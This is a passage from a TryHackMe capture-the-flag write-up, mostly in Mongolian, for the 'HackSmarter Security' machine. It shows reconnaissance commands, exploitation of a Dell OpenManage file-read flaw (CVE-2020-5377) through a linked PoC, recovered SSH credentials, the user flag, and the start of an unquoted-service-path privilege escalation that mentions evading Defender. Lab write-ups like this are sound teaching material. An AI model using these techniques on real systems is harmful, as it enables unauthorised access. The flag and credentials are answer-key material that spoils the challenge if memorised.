# HackSmarter Security THM
*** 
Difficulty - Medium

## Description
    Can you hack the hackers?

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/2.png">
</p>

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/3.png">
</p>

## Solve

<p> Nmap , gobuster хийж эхлэнэ.  
``sudo nmap -A -sC -sV -sF 10.10.187.78``
``gobuster dir -u 10.10.130.21 -w /usr/share/wordlists/dirb/common.txt``
</p>

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/Screenshot_2024-03-22_11-03-40.png">
</p>

gobuster дээр 80р порт хаалттай байсаэ тул ажилаагүй харин nmap -с 1311-р порт онгорхой байгаа мэдээлэл авсан тиймээс орж үзэхэд 
Dell emc openmanager login хэсэг байсан.

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/1.png">
</p>

about хэсэгээс version ий мэдээлэл нь 9.4.0.2 гэж байсан тиймээс searchsploit оос Dell emc openmanager гэж хайхад 
CVE-2020-5377 буюу Arbitrary File Read Vuln эмзэг байдалтай байсан.

Github аас мөн POC олсон 
https://github.com/RhinoSecurityLabs/CVEs/blob/master/CVE-2020-5377_CVE-2021-21514/CVE-2020-5377.py

POC ажилуулах комманд - 
``python hacksmart.py 10.4.49.166 10.10.187.78:1311``
Мэдээлэл агуулсан файлын path -
`` \inetpub\wwwroot\hacksmartersec\web.config ``

web.config дотор хэрэглэгчийн нэвтрэх мэдээлэл байсан.
``cred - user "tyler" pass - "IAmA1337h4x0randIkn0wit!"``
Үүнийг ашиглаад ssh ээр хандаж ороход 

<p align="center">
  <img src="https://github.com/Uz169/F.NS357-Machines-writeup/blob/main/Hacksmarter%20THM%20medium/files/4.png">
</p>

ингээд user.txt -г олсон.
type ``user.txt - THM{4ll15n0tw3llw1thd3ll}`` 

Одоо root.txt авахын тулд эрхийн түвшинг ихэсгэх үе шатандаа орно.

<p>Ямар нэгэн privilage escalation хийх боломж хайж 30-40 минут зарсаны дараа Program files (x86) дотроос Spoofer гэдэг нэмэлтээр суулгасан программ
олсон ба changes.txt дотор нь spoofer-1.4.6 (2020-07-24) гэж байсан хайгаад үзэхэд unquoted service path гэдэг Privilage escalation хийх боломж үүсдэг
эмзэг байдалтай байсан.
</p>

``
Unquoted service path - In simple terms, when a service is created whose executable path
contains spaces and isn't enclosed within quotes, leads to a vulnerability known as 
Unquoted Service Path which allows a user to gain SYSTEM privileges 
(only if the vulnerable service is running with SYSTEM privilege level 
which most of the time it is).
``
<p>Spoofer folder дотор бичих эрхгүй ч гэсэн устгах шинээр файл үүсгэх, serviceг асаах,зогсоох эрхтэй байсан.</p>

``
sc.exe stop spoofer-scheduler - Унтраах
sc.exe start spoofer-scheduler - Асаах
``
Тиймээс хэрвээ энэхүү service -г унраагаад оронд нь өөрийнхөө хортой программуудыг ажиллуулаад асаавал ажиллана гэсэн үг юм.
Гэхдээ Windows defender ажиллах байсан тул код нь илэрсэн тохиолдолд Quarantine хийгдэх тул 


